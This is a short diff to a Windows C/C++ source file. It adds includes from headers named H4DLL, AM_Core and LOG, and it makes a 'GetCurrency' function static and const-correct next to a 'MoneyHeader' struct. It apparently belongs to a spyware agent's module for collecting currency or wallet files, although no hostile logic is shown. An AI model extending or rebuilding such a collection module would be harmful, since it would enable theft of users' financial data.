@@ -1,3 +1,8 @@
+#include <Windows.h>
+#include <json/JSON.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/LOG.h"
 struct MoneyHeader {
 #define MONEY_VERSION 2014010101
 	DWORD version;
@@ -10,7 +15,7 @@ struct MoneyHeader {
 	DWORD file_name_len;
 };
 
-void GetCurrency(WCHAR *currency_path, DWORD type)
+static void GetCurrency(const WCHAR *currency_path, DWORD type)
 {
 	WCHAR expanded_currency_path[MAX_PATH];
 	BYTE read_buff[2048];
